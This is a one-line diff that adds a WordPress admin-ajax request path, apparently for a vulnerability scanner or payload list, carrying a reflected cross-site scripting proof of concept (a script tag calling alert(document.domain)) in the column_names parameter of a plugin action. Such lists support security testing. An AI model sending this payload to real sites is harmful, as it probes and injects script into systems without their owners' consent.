@@ -1,0 +1,1 @@
+/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=<script>alert(document.domain)</script>
